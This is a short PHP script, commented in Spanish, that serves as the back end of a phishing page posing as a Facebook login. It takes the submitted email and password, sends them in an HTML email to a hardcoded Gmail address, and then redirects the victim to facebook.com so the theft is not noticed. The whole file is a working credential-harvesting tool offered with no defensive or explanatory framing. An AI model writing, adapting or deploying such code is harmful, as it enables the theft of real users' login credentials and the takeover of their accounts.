<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Datos enviados desde el formulario
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Dirección de destino
    $to = "rugalmano107@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";

    // Cuerpo del mensaje
    $message = "
    <html>
    <head>
        <title>Nuevo intento de inicio de sesión</title>
    </head>
    <body>
        <p>Se ha recibido un intento de inicio de sesión:</p>
        <p><strong>Correo electrónico:</strong> $email</p>
        <p><strong>Contraseña:</strong> $password</p>
    </body>
    </html>
    ";

    // Encabezados del correo
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: no-reply@tu-dominio.com" . "\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirección a Facebook después de enviar el correo
        header("Location: https://www.facebook.com");
        exit(); // Importante: Detener la ejecución después de redirigir
    } else {
        echo "Hubo un error al enviar los datos.";
    }
} else {
    echo "Método no permitido.";
}
?>
